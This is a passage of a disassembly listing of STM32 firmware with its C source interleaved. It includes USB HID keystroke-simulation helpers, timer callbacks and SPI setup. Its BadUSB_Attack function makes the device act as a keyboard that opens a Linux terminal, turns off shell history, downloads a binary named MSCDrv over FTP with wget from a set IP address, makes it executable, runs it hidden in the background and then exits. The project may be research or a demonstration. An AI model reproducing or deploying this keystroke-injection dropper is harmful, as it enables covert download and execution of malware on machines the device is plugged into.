 8000a5e:	4413      	add	r3, r2
 8000a60:	781a      	ldrb	r2, [r3, #0]
 8000a62:	7bfb      	ldrb	r3, [r7, #15]
 8000a64:	6879      	ldr	r1, [r7, #4]
 8000a66:	440b      	add	r3, r1
 8000a68:	f022 0208 	bic.w	r2, r2, #8
 8000a6c:	b2d2      	uxtb	r2, r2
 8000a6e:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a70:	7bfb      	ldrb	r3, [r7, #15]
 8000a72:	3320      	adds	r3, #32
 8000a74:	687a      	ldr	r2, [r7, #4]
 8000a76:	4413      	add	r3, r2
 8000a78:	781a      	ldrb	r2, [r3, #0]
 8000a7a:	7bfb      	ldrb	r3, [r7, #15]
 8000a7c:	3320      	adds	r3, #32
 8000a7e:	6879      	ldr	r1, [r7, #4]
 8000a80:	440b      	add	r3, r1
 8000a82:	f042 0208 	orr.w	r2, r2, #8
 8000a86:	b2d2      	uxtb	r2, r2
 8000a88:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a8a:	7bfb      	ldrb	r3, [r7, #15]
 8000a8c:	3301      	adds	r3, #1
 8000a8e:	73fb      	strb	r3, [r7, #15]
 8000a90:	7bfb      	ldrb	r3, [r7, #15]
 8000a92:	2b5a      	cmp	r3, #90	; 0x5a
 8000a94:	d9e1      	bls.n	8000a5a <Convert2CapsMap+0xe>
	}
}
 8000a96:	bf00      	nop
 8000a98:	bf00      	nop
 8000a9a:	3714      	adds	r7, #20
 8000a9c:	46bd      	mov	sp, r7
 8000a9e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000aa2:	4770      	bx	lr

08000aa4 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000aa4:	b580      	push	{r7, lr}
 8000aa6:	b082      	sub	sp, #8
 8000aa8:	af00      	add	r7, sp, #0
 8000aaa:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000aac:	687b      	ldr	r3, [r7, #4]
 8000aae:	681b      	ldr	r3, [r3, #0]
 8000ab0:	2b01      	cmp	r3, #1
 8000ab2:	d10f      	bne.n	8000ad4 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000ab4:	687b      	ldr	r3, [r7, #4]
 8000ab6:	2200      	movs	r2, #0
 8000ab8:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000aba:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000abe:	695b      	ldr	r3, [r3, #20]
 8000ac0:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000ac4:	f043 0301 	orr.w	r3, r3, #1
 8000ac8:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000aca:	f000 fabb 	bl	8001044 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000ace:	4803      	ldr	r0, [pc, #12]	; (8000adc <InterruptTrap+0x38>)
 8000ad0:	f004 fa04 	bl	8004edc <HAL_TIM_Base_Start_IT>
	}
}
 8000ad4:	bf00      	nop
 8000ad6:	3708      	adds	r7, #8
 8000ad8:	46bd      	mov	sp, r7
 8000ada:	bd80      	pop	{r7, pc}
 8000adc:	200002e4 	.word	0x200002e4

08000ae0 <TestHID>:

int TestHID(){
 8000ae0:	b580      	push	{r7, lr}
 8000ae2:	b082      	sub	sp, #8
 8000ae4:	af00      	add	r7, sp, #0
	char testStr[4] = {133, 133, 133, 133};
 8000ae6:	f04f 3385 	mov.w	r3, #2240120197	; 0x85858585
 8000aea:	603b      	str	r3, [r7, #0]
	SimulateKeyStroke(133);
 8000aec:	2085      	movs	r0, #133	; 0x85
 8000aee:	f7ff ff2d 	bl	800094c <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x01;
 8000af2:	4b0d      	ldr	r3, [pc, #52]	; (8000b28 <TestHID+0x48>)
 8000af4:	781b      	ldrb	r3, [r3, #0]
 8000af6:	f003 0301 	and.w	r3, r3, #1
 8000afa:	71fb      	strb	r3, [r7, #7]
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
 8000afc:	463b      	mov	r3, r7
 8000afe:	4a0b      	ldr	r2, [pc, #44]	; (8000b2c <TestHID+0x4c>)
 8000b00:	2104      	movs	r1, #4
 8000b02:	4618      	mov	r0, r3
 8000b04:	f7ff ff64 	bl	80009d0 <SimulateKeyStrokes>
	uint8_t CurrState = recv_buffer[0]&0x01;
 8000b08:	4b07      	ldr	r3, [pc, #28]	; (8000b28 <TestHID+0x48>)
 8000b0a:	781b      	ldrb	r3, [r3, #0]
 8000b0c:	f003 0301 	and.w	r3, r3, #1
 8000b10:	71bb      	strb	r3, [r7, #6]
	return PrevState == CurrState;
 8000b12:	79fa      	ldrb	r2, [r7, #7]
 8000b14:	79bb      	ldrb	r3, [r7, #6]
 8000b16:	429a      	cmp	r2, r3
 8000b18:	bf0c      	ite	eq
 8000b1a:	2301      	moveq	r3, #1
 8000b1c:	2300      	movne	r3, #0
 8000b1e:	b2db      	uxtb	r3, r3
}
 8000b20:	4618      	mov	r0, r3
 8000b22:	3708      	adds	r7, #8
 8000b24:	46bd      	mov	sp, r7
 8000b26:	bd80      	pop	{r7, pc}
 8000b28:	2000026c 	.word	0x2000026c
 8000b2c:	20000278 	.word	0x20000278

08000b30 <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 8000b30:	b5b0      	push	{r4, r5, r7, lr}
 8000b32:	b0c4      	sub	sp, #272	; 0x110
 8000b34:	af00      	add	r7, sp, #0
 8000b36:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b3a:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b3e:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 8000b40:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b44:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b48:	681b      	ldr	r3, [r3, #0]
 8000b4a:	2b00      	cmp	r3, #0
 8000b4c:	d171      	bne.n	8000c32 <BadUSB_Attack+0x102>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b4e:	4a90      	ldr	r2, [pc, #576]	; (8000d90 <BadUSB_Attack+0x260>)
 8000b50:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b54:	6812      	ldr	r2, [r2, #0]
 8000b56:	4611      	mov	r1, r2
 8000b58:	8019      	strh	r1, [r3, #0]
 8000b5a:	3302      	adds	r3, #2
 8000b5c:	0c12      	lsrs	r2, r2, #16
 8000b5e:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256] = {'\0'};
 8000b60:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000b68:	2200      	movs	r2, #0
 8000b6a:	601a      	str	r2, [r3, #0]
 8000b6c:	3304      	adds	r3, #4
 8000b6e:	22fc      	movs	r2, #252	; 0xfc
 8000b70:	2100      	movs	r1, #0
 8000b72:	4618      	mov	r0, r3
 8000b74:	f00c fb1a 	bl	800d1ac <memset>
		strcat(AttackStr0, "set +o history\n");
 8000b78:	f107 0308 	add.w	r3, r7, #8
 8000b7c:	4618      	mov	r0, r3
 8000b7e:	f7ff fb25 	bl	80001cc <strlen>
 8000b82:	4603      	mov	r3, r0
 8000b84:	461a      	mov	r2, r3
 8000b86:	f107 0308 	add.w	r3, r7, #8
 8000b8a:	4413      	add	r3, r2
 8000b8c:	4a81      	ldr	r2, [pc, #516]	; (8000d94 <BadUSB_Attack+0x264>)
 8000b8e:	461c      	mov	r4, r3
 8000b90:	4615      	mov	r5, r2
 8000b92:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000b94:	6020      	str	r0, [r4, #0]
 8000b96:	6061      	str	r1, [r4, #4]
 8000b98:	60a2      	str	r2, [r4, #8]
 8000b9a:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr0, "cd /home/user/Templates\n");
 8000b9c:	f107 0308 	add.w	r3, r7, #8
 8000ba0:	4618      	mov	r0, r3
 8000ba2:	f7ff fb13 	bl	80001cc <strlen>
 8000ba6:	4603      	mov	r3, r0
 8000ba8:	461a      	mov	r2, r3
 8000baa:	f107 0308 	add.w	r3, r7, #8
 8000bae:	4413      	add	r3, r2
 8000bb0:	4a79      	ldr	r2, [pc, #484]	; (8000d98 <BadUSB_Attack+0x268>)
 8000bb2:	461d      	mov	r5, r3
 8000bb4:	4614      	mov	r4, r2
 8000bb6:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000bb8:	6028      	str	r0, [r5, #0]
 8000bba:	6069      	str	r1, [r5, #4]
 8000bbc:	60aa      	str	r2, [r5, #8]
 8000bbe:	60eb      	str	r3, [r5, #12]
 8000bc0:	cc03      	ldmia	r4!, {r0, r1}
 8000bc2:	6128      	str	r0, [r5, #16]
 8000bc4:	6169      	str	r1, [r5, #20]
 8000bc6:	7823      	ldrb	r3, [r4, #0]
 8000bc8:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr0, "wget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\n");
 8000bca:	f107 0308 	add.w	r3, r7, #8
 8000bce:	4618      	mov	r0, r3
 8000bd0:	f7ff fafc 	bl	80001cc <strlen>
 8000bd4:	4603      	mov	r3, r0
 8000bd6:	461a      	mov	r2, r3
 8000bd8:	f107 0308 	add.w	r3, r7, #8
 8000bdc:	4413      	add	r3, r2
 8000bde:	4a6f      	ldr	r2, [pc, #444]	; (8000d9c <BadUSB_Attack+0x26c>)
 8000be0:	4618      	mov	r0, r3
 8000be2:	4611      	mov	r1, r2
 8000be4:	2342      	movs	r3, #66	; 0x42
 8000be6:	461a      	mov	r2, r3
 8000be8:	f00c fb0c 	bl	800d204 <memcpy>
		strcat(AttackStr0, "exit\n");
 8000bec:	f107 0308 	add.w	r3, r7, #8
 8000bf0:	4618      	mov	r0, r3
 8000bf2:	f7ff faeb 	bl	80001cc <strlen>
 8000bf6:	4603      	mov	r3, r0
 8000bf8:	461a      	mov	r2, r3
 8000bfa:	f107 0308 	add.w	r3, r7, #8
 8000bfe:	4413      	add	r3, r2
 8000c00:	4a67      	ldr	r2, [pc, #412]	; (8000da0 <BadUSB_Attack+0x270>)
 8000c02:	6810      	ldr	r0, [r2, #0]
 8000c04:	6018      	str	r0, [r3, #0]
 8000c06:	8892      	ldrh	r2, [r2, #4]
 8000c08:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000c0a:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000c0e:	2103      	movs	r1, #3
 8000c10:	4618      	mov	r0, r3
 8000c12:	f7ff feb1 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000c16:	f107 0308 	add.w	r3, r7, #8
 8000c1a:	4618      	mov	r0, r3
 8000c1c:	f7ff fad6 	bl	80001cc <strlen>
 8000c20:	4603      	mov	r3, r0
 8000c22:	4619      	mov	r1, r3
 8000c24:	f107 0308 	add.w	r3, r7, #8
 8000c28:	4a5e      	ldr	r2, [pc, #376]	; (8000da4 <BadUSB_Attack+0x274>)
 8000c2a:	4618      	mov	r0, r3
 8000c2c:	f7ff fed0 	bl	80009d0 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000c30:	e0a8      	b.n	8000d84 <BadUSB_Attack+0x254>
	}else if(stage == 1){
 8000c32:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000c36:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000c3a:	681b      	ldr	r3, [r3, #0]
 8000c3c:	2b01      	cmp	r3, #1
 8000c3e:	f040 808b 	bne.w	8000d58 <BadUSB_Attack+0x228>
		uint8_t Terminal[3] = LinuxTerminal;
 8000c42:	4a53      	ldr	r2, [pc, #332]	; (8000d90 <BadUSB_Attack+0x260>)
 8000c44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000c48:	6812      	ldr	r2, [r2, #0]
 8000c4a:	4611      	mov	r1, r2
 8000c4c:	8019      	strh	r1, [r3, #0]
 8000c4e:	3302      	adds	r3, #2
 8000c50:	0c12      	lsrs	r2, r2, #16
 8000c52:	701a      	strb	r2, [r3, #0]
		char AttackStr1[256] = {'\0'};
 8000c54:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000c58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000c5c:	2200      	movs	r2, #0
 8000c5e:	601a      	str	r2, [r3, #0]
 8000c60:	3304      	adds	r3, #4
 8000c62:	22fc      	movs	r2, #252	; 0xfc
 8000c64:	2100      	movs	r1, #0
 8000c66:	4618      	mov	r0, r3
 8000c68:	f00c faa0 	bl	800d1ac <memset>
		strcat(AttackStr1, "cd /home/user/Templates\n");
 8000c6c:	f107 0308 	add.w	r3, r7, #8
 8000c70:	4618      	mov	r0, r3
 8000c72:	f7ff faab 	bl	80001cc <strlen>
 8000c76:	4603      	mov	r3, r0
 8000c78:	461a      	mov	r2, r3
 8000c7a:	f107 0308 	add.w	r3, r7, #8
 8000c7e:	4413      	add	r3, r2
 8000c80:	4a45      	ldr	r2, [pc, #276]	; (8000d98 <BadUSB_Attack+0x268>)
 8000c82:	461d      	mov	r5, r3
 8000c84:	4614      	mov	r4, r2
 8000c86:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000c88:	6028      	str	r0, [r5, #0]
 8000c8a:	6069      	str	r1, [r5, #4]
 8000c8c:	60aa      	str	r2, [r5, #8]
 8000c8e:	60eb      	str	r3, [r5, #12]
 8000c90:	cc03      	ldmia	r4!, {r0, r1}
 8000c92:	6128      	str	r0, [r5, #16]
 8000c94:	6169      	str	r1, [r5, #20]
 8000c96:	7823      	ldrb	r3, [r4, #0]
 8000c98:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr1, "chmod 777 MSCDrv\n");
 8000c9a:	f107 0308 	add.w	r3, r7, #8
 8000c9e:	4618      	mov	r0, r3
 8000ca0:	f7ff fa94 	bl	80001cc <strlen>
 8000ca4:	4603      	mov	r3, r0
 8000ca6:	461a      	mov	r2, r3
 8000ca8:	f107 0308 	add.w	r3, r7, #8
 8000cac:	4413      	add	r3, r2
 8000cae:	4a3e      	ldr	r2, [pc, #248]	; (8000da8 <BadUSB_Attack+0x278>)
 8000cb0:	461d      	mov	r5, r3
 8000cb2:	4614      	mov	r4, r2
 8000cb4:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000cb6:	6028      	str	r0, [r5, #0]
 8000cb8:	6069      	str	r1, [r5, #4]
 8000cba:	60aa      	str	r2, [r5, #8]
 8000cbc:	60eb      	str	r3, [r5, #12]
 8000cbe:	8823      	ldrh	r3, [r4, #0]
 8000cc0:	822b      	strh	r3, [r5, #16]
		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
 8000cc2:	f107 0308 	add.w	r3, r7, #8
 8000cc6:	4618      	mov	r0, r3
 8000cc8:	f7ff fa80 	bl	80001cc <strlen>
 8000ccc:	4603      	mov	r3, r0
 8000cce:	461a      	mov	r2, r3
 8000cd0:	f107 0308 	add.w	r3, r7, #8
 8000cd4:	4413      	add	r3, r2
 8000cd6:	4a35      	ldr	r2, [pc, #212]	; (8000dac <BadUSB_Attack+0x27c>)
 8000cd8:	461d      	mov	r5, r3
 8000cda:	4614      	mov	r4, r2
 8000cdc:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000cde:	6028      	str	r0, [r5, #0]
 8000ce0:	6069      	str	r1, [r5, #4]
 8000ce2:	60aa      	str	r2, [r5, #8]
 8000ce4:	60eb      	str	r3, [r5, #12]
 8000ce6:	cc07      	ldmia	r4!, {r0, r1, r2}
 8000ce8:	6128      	str	r0, [r5, #16]
 8000cea:	6169      	str	r1, [r5, #20]
 8000cec:	61aa      	str	r2, [r5, #24]
		strcat(AttackStr1, "set -o history\n");
 8000cee:	f107 0308 	add.w	r3, r7, #8
 8000cf2:	4618      	mov	r0, r3
 8000cf4:	f7ff fa6a 	bl	80001cc <strlen>
 8000cf8:	4603      	mov	r3, r0
 8000cfa:	461a      	mov	r2, r3
 8000cfc:	f107 0308 	add.w	r3, r7, #8
 8000d00:	4413      	add	r3, r2
 8000d02:	4a2b      	ldr	r2, [pc, #172]	; (8000db0 <BadUSB_Attack+0x280>)
 8000d04:	461c      	mov	r4, r3
 8000d06:	4615      	mov	r5, r2
 8000d08:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000d0a:	6020      	str	r0, [r4, #0]
 8000d0c:	6061      	str	r1, [r4, #4]
 8000d0e:	60a2      	str	r2, [r4, #8]
 8000d10:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr1, "exit\n");
 8000d12:	f107 0308 	add.w	r3, r7, #8
 8000d16:	4618      	mov	r0, r3
 8000d18:	f7ff fa58 	bl	80001cc <strlen>
 8000d1c:	4603      	mov	r3, r0
 8000d1e:	461a      	mov	r2, r3
 8000d20:	f107 0308 	add.w	r3, r7, #8
 8000d24:	4413      	add	r3, r2
 8000d26:	4a1e      	ldr	r2, [pc, #120]	; (8000da0 <BadUSB_Attack+0x270>)
 8000d28:	6810      	ldr	r0, [r2, #0]
 8000d2a:	6018      	str	r0, [r3, #0]
 8000d2c:	8892      	ldrh	r2, [r2, #4]
 8000d2e:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000d30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000d34:	2103      	movs	r1, #3
 8000d36:	4618      	mov	r0, r3
 8000d38:	f7ff fe1e 	bl	8000978 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000d3c:	f107 0308 	add.w	r3, r7, #8
 8000d40:	4618      	mov	r0, r3
 8000d42:	f7ff fa43 	bl	80001cc <strlen>
 8000d46:	4603      	mov	r3, r0
 8000d48:	4619      	mov	r1, r3
 8000d4a:	f107 0308 	add.w	r3, r7, #8
 8000d4e:	4a15      	ldr	r2, [pc, #84]	; (8000da4 <BadUSB_Attack+0x274>)
 8000d50:	4618      	mov	r0, r3
 8000d52:	f7ff fe3d 	bl	80009d0 <SimulateKeyStrokes>
}
 8000d56:	e015      	b.n	8000d84 <BadUSB_Attack+0x254>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000d58:	f107 0308 	add.w	r3, r7, #8
 8000d5c:	4a15      	ldr	r2, [pc, #84]	; (8000db4 <BadUSB_Attack+0x284>)
 8000d5e:	4618      	mov	r0, r3
 8000d60:	4611      	mov	r1, r2
 8000d62:	234e      	movs	r3, #78	; 0x4e
 8000d64:	461a      	mov	r2, r3
 8000d66:	f00c fa4d 	bl	800d204 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000d6a:	f107 0308 	add.w	r3, r7, #8
 8000d6e:	4618      	mov	r0, r3
 8000d70:	f7ff fa2c 	bl	80001cc <strlen>
 8000d74:	4603      	mov	r3, r0
 8000d76:	4619      	mov	r1, r3
 8000d78:	f107 0308 	add.w	r3, r7, #8
 8000d7c:	4a09      	ldr	r2, [pc, #36]	; (8000da4 <BadUSB_Attack+0x274>)
 8000d7e:	4618      	mov	r0, r3
 8000d80:	f7ff fe26 	bl	80009d0 <SimulateKeyStrokes>
}
 8000d84:	bf00      	nop
 8000d86:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000d8a:	46bd      	mov	sp, r7
 8000d8c:	bdb0      	pop	{r4, r5, r7, pc}
 8000d8e:	bf00      	nop
 8000d90:	0800d3c8 	.word	0x0800d3c8
 8000d94:	0800d2c0 	.word	0x0800d2c0
 8000d98:	0800d2d0 	.word	0x0800d2d0
 8000d9c:	0800d2ec 	.word	0x0800d2ec
 8000da0:	0800d330 	.word	0x0800d330
 8000da4:	20000278 	.word	0x20000278
 8000da8:	0800d338 	.word	0x0800d338
 8000dac:	0800d34c 	.word	0x0800d34c
 8000db0:	0800d368 	.word	0x0800d368
 8000db4:	0800d378 	.word	0x0800d378

08000db8 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000db8:	b580      	push	{r7, lr}
 8000dba:	b082      	sub	sp, #8
 8000dbc:	af00      	add	r7, sp, #0
 8000dbe:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000dc0:	687b      	ldr	r3, [r7, #4]
 8000dc2:	4a1d      	ldr	r2, [pc, #116]	; (8000e38 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000dc4:	4293      	cmp	r3, r2
 8000dc6:	d133      	bne.n	8000e30 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000dc8:	4b1c      	ldr	r3, [pc, #112]	; (8000e3c <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000dca:	681b      	ldr	r3, [r3, #0]
 8000dcc:	2b00      	cmp	r3, #0
 8000dce:	d108      	bne.n	8000de2 <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000dd0:	2080      	movs	r0, #128	; 0x80
 8000dd2:	f7ff fce5 	bl	80007a0 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000dd6:	220f      	movs	r2, #15
 8000dd8:	4919      	ldr	r1, [pc, #100]	; (8000e40 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000dda:	481a      	ldr	r0, [pc, #104]	; (8000e44 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000ddc:	f007 feec 	bl	8008bb8 <USBD_CUSTOM_HID_SendReport>
 8000de0:	e018      	b.n	8000e14 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000de2:	4b16      	ldr	r3, [pc, #88]	; (8000e3c <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000de4:	681b      	ldr	r3, [r3, #0]
 8000de6:	2b01      	cmp	r3, #1
 8000de8:	d10c      	bne.n	8000e04 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000dea:	f7ff fd9d 	bl	8000928 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000dee:	4b16      	ldr	r3, [pc, #88]	; (8000e48 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000df0:	781b      	ldrb	r3, [r3, #0]
 8000df2:	f003 0302 	and.w	r3, r3, #2
 8000df6:	2b00      	cmp	r3, #0
 8000df8:	d10c      	bne.n	8000e14 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000dfa:	4b10      	ldr	r3, [pc, #64]	; (8000e3c <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000dfc:	f04f 32ff 	mov.w	r2, #4294967295
 8000e00:	601a      	str	r2, [r3, #0]
 8000e02:	e007      	b.n	8000e14 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000e04:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000e08:	681b      	ldr	r3, [r3, #0]
 8000e0a:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e0e:	f023 0301 	bic.w	r3, r3, #1
 8000e12:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000e14:	4b09      	ldr	r3, [pc, #36]	; (8000e3c <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e16:	681b      	ldr	r3, [r3, #0]
 8000e18:	1c59      	adds	r1, r3, #1
 8000e1a:	4b0c      	ldr	r3, [pc, #48]	; (8000e4c <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000e1c:	fb83 3201 	smull	r3, r2, r3, r1
 8000e20:	17cb      	asrs	r3, r1, #31
 8000e22:	1ad2      	subs	r2, r2, r3
 8000e24:	4613      	mov	r3, r2
 8000e26:	005b      	lsls	r3, r3, #1
 8000e28:	4413      	add	r3, r2
 8000e2a:	1aca      	subs	r2, r1, r3
 8000e2c:	4b03      	ldr	r3, [pc, #12]	; (8000e3c <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e2e:	601a      	str	r2, [r3, #0]
	}
}
 8000e30:	bf00      	nop
 8000e32:	3708      	adds	r7, #8
 8000e34:	46bd      	mov	sp, r7
 8000e36:	bd80      	pop	{r7, pc}
 8000e38:	200002e4 	.word	0x200002e4
 8000e3c:	20000274 	.word	0x20000274
 8000e40:	2000025c 	.word	0x2000025c
 8000e44:	200003c0 	.word	0x200003c0
 8000e48:	2000026c 	.word	0x2000026c
 8000e4c:	55555556 	.word	0x55555556

08000e50 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000e50:	b480      	push	{r7}
 8000e52:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000e54:	b672      	cpsid	i
}
 8000e56:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000e58:	e7fe      	b.n	8000e58 <Error_Handler+0x8>
	...

08000e5c <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000e5c:	b580      	push	{r7, lr}
 8000e5e:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000e60:	4b1b      	ldr	r3, [pc, #108]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e62:	4a1c      	ldr	r2, [pc, #112]	; (8000ed4 <MX_SPI1_Init+0x78>)
 8000e64:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000e66:	4b1a      	ldr	r3, [pc, #104]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e68:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000e6c:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000e6e:	4b18      	ldr	r3, [pc, #96]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e70:	2200      	movs	r2, #0
 8000e72:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000e74:	4b16      	ldr	r3, [pc, #88]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e76:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000e7a:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000e7c:	4b14      	ldr	r3, [pc, #80]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e7e:	2200      	movs	r2, #0
 8000e80:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000e82:	4b13      	ldr	r3, [pc, #76]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e84:	2200      	movs	r2, #0
 8000e86:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000e88:	4b11      	ldr	r3, [pc, #68]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e8a:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000e8e:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000e90:	4b0f      	ldr	r3, [pc, #60]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e92:	2228      	movs	r2, #40	; 0x28
 8000e94:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000e96:	4b0e      	ldr	r3, [pc, #56]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e98:	2200      	movs	r2, #0
 8000e9a:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000e9c:	4b0c      	ldr	r3, [pc, #48]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000e9e:	2200      	movs	r2, #0
 8000ea0:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000ea2:	4b0b      	ldr	r3, [pc, #44]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000ea4:	2200      	movs	r2, #0
 8000ea6:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000ea8:	4b09      	ldr	r3, [pc, #36]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000eaa:	2207      	movs	r2, #7
 8000eac:	62da      	str	r2, [r3, #44]	; 0x2c
